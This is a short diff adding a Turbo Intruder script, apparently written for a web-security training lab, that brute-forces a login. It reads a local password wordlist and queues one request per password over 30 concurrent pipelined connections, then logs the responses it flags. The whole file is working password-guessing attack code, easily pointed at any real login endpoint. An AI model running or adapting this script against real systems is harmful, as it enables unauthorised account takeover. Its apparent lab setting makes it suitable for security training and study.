@@ -1,0 +1,20 @@
+
+
+
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=30,
+                           requestsPerConnection=1,
+                           pipeline=True
+                           )
+
+    # Read the wordlist file and queue a request for each password
+    with open('/Users/johnmcglinchey/PHPAttack/passwordsForCarlos.txt', 'r') as file:
+        wordlist = file.read().splitlines()
+        for word in wordlist:
+            engine.queue(target.req, word)
+
+def handleResponse(req, interesting):
+    if interesting:
+        table.add(req)
